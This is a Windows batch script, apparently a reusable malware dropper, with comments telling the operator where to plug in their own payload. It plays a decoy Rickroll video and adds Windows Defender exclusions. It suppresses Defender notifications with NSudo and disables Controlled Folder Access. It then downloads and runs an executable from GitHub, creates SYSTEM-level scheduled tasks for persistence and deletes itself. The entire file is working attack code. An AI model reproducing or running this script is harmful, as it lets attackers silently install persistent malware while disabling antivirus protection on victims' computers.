color ef
curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Rickroll.mp4" --output "Rickroll.mp4"
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%~dp0'"
curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/AV.bat" --output "AV.bat"
start /min AV.bat
powershell -Command "Unblock-file 'AV.bat'"
curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/NSudo.exe" --output "NSudo.exe"
NSudo -U:T -ShowWindowMode:Hide reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /t REG_DWORD /d "1" /f
::disables ControlledFolderAccess to access files and folders
powershell -command "Set-MpPreference -EnableControlledFolderAccess Disabled"
::windows defender exclusions
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '"Windows.exe'"
::direct download link
::edit this to your files
md "%systemroot%\System32\Windowsexe"
start "" Rickroll.mp4

::upload files here: github.com - create account and create repository (public) then upload files
::put payload file DIRECT download link here:
curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Windows.exe" --output "%appdata%\Windows.exe"
::do not change the --output, unless the payload is not a .exe file. (in that case, change all mentions of Windows.exe to Windows.extension)


move "%appdata%\Windows.exe" "%systemroot%\System32\Windowsexe"
curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/Update.bat" "%appdata%\update.bat"
powershell -Command "Unblock-file 'Update.bat'"
move "%appdata%\update.bat" "%systemroot%\System32\Windowsexe"
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%systemroot%\System32\Windowsexe'"
NSudo -U:T -ShowWindowMode:Hide reg del "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /f
powershell -Command "Unblock-file '%systemroot%\System32\Windowsexe\Windows.exe'"
start "Windows.exe" "%systemroot%\System32\Windowsexe\Windows.exe"
move "AV.bat" "%systemroot%\System32\Windowsexe\AV.bat"
powershell -inputformat none -outputformat none -NonInteractive -Command "Remove-MpPreference -ExclusionPath '"%~dp0'"
SCHTASKS /CREATE /F /SC ONSTART /TR "%systemroot%\System32\Windowsexe\Windows.exe" /TN "Windows.exe" /RL HIGHEST /RU SYSTEM
SCHTASKS /CREATE /F /SC MINUTE /TR "%systemroot%\System32\Windowsexe\AV.bat" /TN "AV.bat" /RL HIGHEST /RU SYSTEM
SCHTASKS /CREATE /F /SC DAILY /TR "%systemroot%\System32\Windowsexe\Update.bat" /TN "Update.bat" /RL HIGHEST /RU SYSTEM
del NSudo.exe
color 0a
pause
call :deleteSelf&exit
:deleteSelf
start /b "" cmd /c del "%~f0"&exit
